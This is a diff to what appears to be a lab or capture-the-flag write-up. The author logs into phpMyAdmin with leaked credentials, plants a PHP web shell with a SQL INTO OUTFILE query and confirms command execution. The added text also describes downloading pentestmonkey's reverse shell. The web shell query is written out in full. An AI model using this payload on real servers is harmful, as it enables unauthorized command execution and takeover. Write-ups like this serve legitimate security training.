@@ -20,4 +20,19 @@ Pretty quickly I now have DB credentials. Username is **vishal** and password is
 
 <img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/d65b3be9-c6ec-48ad-83c6-9612d022fa82" />
 
-I dug around and got to the /templates directory. I then selected 
+I dug around and got to the /templates directory on Firefox. There were a bunch of different directories but I selected the parent directory which took me to a PHP admin login page.
+
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/5dc473a9-b036-4996-9949-51b835651400" />
+
+I then used the credentials I found earlier from the mysql.bak file which did allow me to login to vishal's account as an admin.
+
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/b46d71b2-ed60-4f0d-8c14-f5f6b26e264c" />
+
+Now that I have access to this app that handles the administration of MySQL over the web, I kind of just explored what was available to see what I could do next. I did some research and found that through an admin account, a php reverse shell can be done. What I did first was execute malicious code as a SQL query which will created a command shell vulnerability inside the web server. It also puts a minimalist command prompt into a file called cmd.php in the /var/www/html/ directory.
+
+I executed this query: **SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd.php'** which then returned nothing as expected. From here, I went back to the host on port 80 and appended **/cmd.php?cmd=pwd** to the URL which returned this:
+
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/f675bbdf-ec15-4448-a06b-28879f7dd023" />
+
+This tells me that I created a successfull command shell vulnerability. The reverse shell that I used was from pentestmonkey. I went to their github repo and ran **wget** to download the raw php file.
+
